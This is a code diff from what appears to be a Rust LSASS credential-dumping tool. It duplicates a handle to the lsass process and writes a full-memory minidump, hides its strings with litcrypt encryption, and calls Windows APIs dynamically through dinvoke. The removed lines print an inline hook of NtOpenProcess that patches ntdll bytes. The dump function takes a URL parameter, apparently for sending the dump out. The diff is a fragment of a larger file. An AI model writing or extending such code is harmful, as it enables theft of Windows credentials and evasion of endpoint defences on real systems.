@@ -1,7 +1,7 @@
 //#![crate_type = "cdylib"]
 //cargo rustc -- --crate-type cdylib 
 #[macro_use]
-extern crate litcrypt;
+extern crate litcrypt2;
 use_litcrypt!();
 
 extern crate base64;
@@ -9,16 +9,15 @@ extern crate base64;
 use bindings::Windows::Win32::Foundation::BOOL;
 use bindings::Windows::Win32::System::Threading::{GetCurrentThread, STARTUPINFOW, PROCESS_INFORMATION};
 use bindings::Windows::Win32::System::WindowsProgramming::IO_STATUS_BLOCK;
-use litcrypt::lc;
+use litcrypt2::lc;
 use rand::{thread_rng, Rng};
 use rand::distributions::Alphanumeric;
 use std::io::Cursor;
 use std::thread;
-use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
-use bindings::Windows::Win32::{Foundation::{HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, PAGE_EXECUTE_READWRITE, THREAD_BASIC_INFORMATION, GENERIC_READ, OVERLAPPED, REQUEST_OPLOCK_INPUT_BUFFER, REQUEST_OPLOCK_OUTPUT_BUFFER, THREAD_ALL_ACCESS, FILE_PROCESS_IDS_USING_FILE_INFORMATION};
+use std::{fs::{self, File}, io::{Read, Write}, mem::size_of, ptr};
+use bindings::Windows::Win32::{Foundation::HANDLE, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
+use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, THREAD_BASIC_INFORMATION, GENERIC_READ, OVERLAPPED, REQUEST_OPLOCK_INPUT_BUFFER, REQUEST_OPLOCK_OUTPUT_BUFFER, THREAD_ALL_ACCESS, FILE_PROCESS_IDS_USING_FILE_INFORMATION};
 
-static mut STATIC_HANDLE: isize = 0;
 
 //#[no_mangle]
 //pub extern "Rust" fn dump(key: &str) {
@@ -345,18 +344,10 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                 transacted_file_handle = z;
                             }
 
-                            STATIC_HANDLE = (*dup_handle).0.clone();
-
-                            if !hook()
-                            {
-                                println!("{}", &lc!("[x] Could not hook NtOpenProcess."));
-                                return;
-                            }
-
                             // We use the duplicated handle to dump the process memory
                             let x = dinvoke::mini_dump_write_dump(
                                 *dup_handle,
-                                lsass_pid.into(),
+                                0,
                                 transacted_file_handle,
                                 0x00000002, // MiniDumpWithFullMemory
                                 ptr::null_mut(),
@@ -485,6 +476,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             else 
                             {
                                 println!("{}", &lc!("[x] Call to MiniDumpWriteDump failed."));
+                                let error = dinvoke::get_last_error();
+                                println!("[x] Error: {error}");
                                 let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                 let _r = dinvoke::close_handle(transaction_handle).unwrap();
                             }                           
@@ -698,97 +691,6 @@ pub fn get_pid_from_image_path(path: &str) -> usize
         } 
 
         let _r = dinvoke::close_handle(file_handle);
-
-        0
-    }
-}
-
-pub fn hook () -> bool
-{
-    unsafe 
-    {
-        let detour = nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
-        let detour_addresss: usize = std::mem::transmute(detour);
-
-        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
-        let handle = GetCurrentProcess();
-        let ntop_base_address = dinvoke::get_function_address(ntdll, &lc!("NtOpenProcess"));
-        let base_address: *mut PVOID = std::mem::transmute(&ntop_base_address);
-        let size = 13 as usize; // for x64 processor
-        let size: *mut usize = std::mem::transmute(&size);
-        let o = u32::default();
-        let old_protection: *mut u32 = std::mem::transmute(&o);
-
-        let z = dinvoke::nt_protect_virtual_memory( 
-            handle,
-            base_address,
-            size,
-            PAGE_EXECUTE_READWRITE,
-            old_protection
-        );
-
-
-        if z != 0
-        {
-            return false;
-        }
-
-        let ntop_base_address = dinvoke::get_function_address(ntdll, &lc!("NtOpenProcess"));
-        let ntop_ptr = ntop_base_address as *mut u8;
-
-        if cfg!(target_pointer_width = "64") {
-
-            *ntop_ptr = 0x49;
-            *(ntop_ptr.add(1)) = 0xBB;
-            *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
-            *(ntop_ptr.add(10)) = 0x41;
-            *(ntop_ptr.add(11)) = 0xFF;
-            *(ntop_ptr.add(12)) = 0xE3;
-    
-        } 
-        else 
-        {
-            *ntop_ptr = 0x68;
-            *(ntop_ptr.add(1) as *mut usize) = detour_addresss;
-            *(ntop_ptr.add(5)) = 0xC3
-        } 
-        
-        let u = u32::default();
-        let unused: *mut u32 = std::mem::transmute(&u);
-
-        let z = dinvoke::nt_protect_virtual_memory(
-            handle,
-            base_address,
-            size,
-            *old_protection,
-            unused
-        );
-
-
-        if z != 0
-        {
-            return false;
-        }
-
-        println!("{}", &lc!("[+] NtOpenProcess hooked."));
-
-        true
-    }
-
-}
-
-pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _object_attributes: *mut OBJECT_ATTRIBUTES, _client_id: *mut CLIENT_ID)  -> i32
-{
-    unsafe 
-    {   
-        let dup_handle = HANDLE{0: STATIC_HANDLE};
-        let _  = dinvoke::set_handle_information(
-            dup_handle,
-            0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
-            0x00000002
-        );
-
-        _process_handle = std::mem::transmute(&dup_handle);
 
         0
     }
